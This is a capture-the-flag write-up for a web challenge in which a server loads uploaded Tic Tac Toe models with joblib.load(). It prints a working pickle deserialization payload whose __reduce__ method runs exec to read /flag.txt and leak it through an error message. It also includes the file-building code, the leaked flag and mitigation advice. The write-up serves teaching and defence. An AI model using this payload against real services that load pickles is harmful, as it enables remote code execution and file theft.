# Tic Tac Toe Web Challenge Write-Up  
**By:** Monish Polimetla  
**Category:** Web  
**Difficulty:** Medium  
**Challenge Type:** CTF Challenge  

---

## Description

This challenge provided a simple web interface to upload a `.joblib` file representing a Tic Tac Toe AI. The uploaded model would play a complete game against the server’s AI. The game logs and final outcome were displayed after uploading the model.

At first, it seems like a machine learning challenge where the goal is to beat the AI. However, with a closer look at the backend code, it becomes clear that the real vulnerability lies in how the server loads and executes the uploaded model.

---

## Goal

Abuse Python's insecure deserialization via `joblib.load()` to extract the contents of `/flag.txt` without playing the game at all.

---

## Web Interface Behavior

From the instructions on the challenge page:

- Your model will receive a list of 9 integers representing the game board:
  - `0` = empty
  - `1` = your moves
  - `2` = opponent's moves

- The model must return a single integer from `0` to `8`, indicating your move.

Behind the scenes, the application does the following:

- Uploads the `.joblib` file  
- Loads the model using `joblib.load()`  
- Plays a full game turn-by-turn  
- Displays the game result or model errors on the page  

---

## Code Behavior

From the source code in `app.py`, the critical vulnerability is here:

```python
user_model = joblib.load(path)

## Payload Construction

### Step 1: Create the Malicious Class

```python
class PickleExploit:
    def __reduce__(self):
        return (exec, ("raise RuntimeError(open('/flag.txt').read())",))
```

- `__reduce__()` defines how an object is serialized and deserialized.
- We return an `exec()` call that throws the contents of the flag as an error.

---

### Step 2: Save the Object as a `.joblib` File

```python
import pickle

with open("pickle_exploit.joblib", "wb") as f:
    pickle.dump(PickleExploit(), f)
```

- This file will now run the `exec(...)` command as soon as the server loads it.

---

## Exploit Execution

We upload `pickle_exploit.joblib` to the challenge site.

The result:

- The server calls `joblib.load()`
- `pickle` runs our `__reduce__()` method
- A `RuntimeError` is thrown with the contents of `/flag.txt`
- The Flask web app catches the error and displays it as:

```
Model error: SVUSCG{04a0bedb1cf32545562ddb58e00e104f}
```

---

## Why It Worked

- `joblib.load()` = `pickle.load()` under the hood
- `pickle.load()` blindly executes instructions returned by `__reduce__()`
- The app prints exception messages back to the user
- The flag was stored in a readable file at `/flag.txt`

This chain made it possible to exfiltrate the flag using only Python deserialization.

---

## Mitigation Advice

This is a textbook example of insecure deserialization. Here’s what should have been done differently:

### What Went Wrong

- Untrusted user input was deserialized without sandboxing.
- `pickle` was used in a production-facing environment.
- Error messages were printed directly to the frontend.

### How to Fix It

- Never use `pickle`, `joblib`, or `dill` to load untrusted content.
- Use safe formats (e.g., ONNX, PMML, JSON) for model uploads.
- Run untrusted code inside an isolated Docker or Firejail sandbox.
- Never show raw exceptions to users — log them privately instead.

---
